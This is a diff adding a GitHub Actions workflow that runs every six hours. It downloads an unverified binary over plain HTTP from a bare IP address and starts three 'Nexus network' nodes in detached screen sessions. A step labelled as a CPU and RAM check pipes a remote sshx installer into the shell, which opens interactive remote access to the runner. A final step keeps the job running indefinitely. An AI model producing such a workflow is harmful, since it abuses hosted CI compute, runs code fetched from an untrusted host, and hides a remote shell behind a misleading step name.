@@ -1,0 +1,45 @@
+name: CI Nexus Setup
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # Setiap 6 jam
+
+jobs:
+  nexus-jobs:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 1
+      matrix:
+        node_ids:
+          - [12429460, 12975174, 13084981]
+
+    steps:
+      - name: Install Nexus CLI
+        run: |
+          mkdir -p ~/.nexus/bin
+          curl -L "http://103.246.188.56:8000/nexus-network-linux-x86_64" -o ~/.nexus/bin/nexus-network
+          chmod +x ~/.nexus/bin/nexus-network
+          ln -sf ~/.nexus/bin/nexus-network ~/.nexus/bin/nexus-cli
+
+      - name: Run 3 Nexus Nodes
+        run: |
+          screen -dmS nexus-${{ matrix.node_ids[0] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[0] }}
+          screen -dmS nexus-${{ matrix.node_ids[1] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[1] }}
+          screen -dmS nexus-${{ matrix.node_ids[2] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[2] }}
+          screen -ls
+
+      - name: Cek RAM & CPU
+        run: |
+          echo "CPU Info:"
+          lscpu
+          echo "Memory Info:"
+          free -h
+          echo "Task Manager:"
+          ps aux
+          curl -sSf https://sshx.io/get | sh -s run > sshx.log &
+          sleep 3
+          cat sshx.log
+
+      - name: Keep session alive
+        run: sleep infinity
